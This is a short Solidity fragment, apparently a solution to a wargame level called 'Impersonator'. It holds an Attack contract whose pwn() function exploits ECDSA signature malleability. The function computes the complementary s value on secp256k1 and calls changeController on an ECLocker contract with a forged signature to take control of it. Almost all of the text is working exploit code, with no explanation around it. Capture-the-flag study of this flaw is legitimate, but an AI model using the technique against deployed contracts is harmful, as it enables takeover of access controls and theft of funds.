...
contract Impersonator is Ownable {
    ...
    constructor(uint256 _lockCounter) Ownable(address(this)) {
...
contract Attack {
    uint256 Secp256k1OrdersN = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    //  mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
    // mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
    // mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
    // r - s - v
    function calculateSimmetricS(bytes32 s) external view returns (bytes32) {
        return bytes32(Secp256k1OrdersN - uint256(s));
    }
    ...
    function pwn(address _locker) external {
        ECLocker(_locker).changeController(0x1c, 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91, 0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f, address(0));
    }
}